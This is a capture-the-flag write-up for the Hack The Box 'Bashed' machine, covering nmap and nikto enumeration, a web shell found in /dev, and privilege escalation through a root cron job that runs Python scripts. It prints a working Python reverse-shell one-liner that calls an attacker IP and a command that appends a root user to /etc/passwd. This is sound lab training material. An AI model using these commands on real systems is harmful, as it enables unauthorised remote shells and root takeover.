---
title: CTF Writeup - HTB Bashed
date: 2023-11-11
author: kei5uke
description: Writeup for HTB Bashed
tags:
  - linux
  - writeup
---


# bashed

# Enumeration

## Nmap

```bash
┌──(root💀kali)-[~/bashed]
└─# nmap -sV -sC -T4 -p- 10.129.65.207 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 22:20 EET
Nmap scan report for 10.129.65.207
Host is up (0.038s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds
```

## Nikto

```bash
┌──(root💀kali)-[~/bashed]
└─# nikto -host 10.129.65.207                      
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.65.207
+ Target Hostname:    10.129.65.207
+ Target Port:        80
+ Start Time:         2023-11-10 22:30:38 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 1e3f, size: 55f8bbac32f80, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /dev/: Directory indexing found.
+ OSVDB-3092: /dev/: This might be interesting...
+ OSVDB-3268: /php/: Directory indexing found.
+ OSVDB-3092: /php/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
```

## Interesting page

Found web shell page dev directory.

![Screenshot 2023-11-10 at 22.36.50.png](bashed%20efd9ba4e5e124df38fb09460192c2804/Screenshot_2023-11-10_at_22.36.50.png)

# Privilege Escalation

```bash
www-data@bashed:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

I ran the PSPY and found hidden cron task.

Seems like root runs python script in the script folder.

```bash
2023/11/10 13:54:01 CMD: UID=0     PID=43970  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
```

I made reverse shell in python but the connection gets cut off immediately.

```bash
www-data@bashed:/scripts$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.14",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" > shell.py
<),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" > shell.py
```

I added a script that writes new root user in /etc/passwd

```bash
www-data@bashed:/scripts$ echo 'open("/etc/passwd","a").write("keisuke:$1$jlX/nz9g$CddSuG5PoTI/9bLGZzDum1:0:0:root:/root:/bin/bash\n")' > root.py
```

# Root shell

![Screenshot 2023-11-11 at 00.11.29.png](bashed%20efd9ba4e5e124df38fb09460192c2804/Screenshot_2023-11-11_at_00.11.29.png)

# Note

I used PSPY for the first time.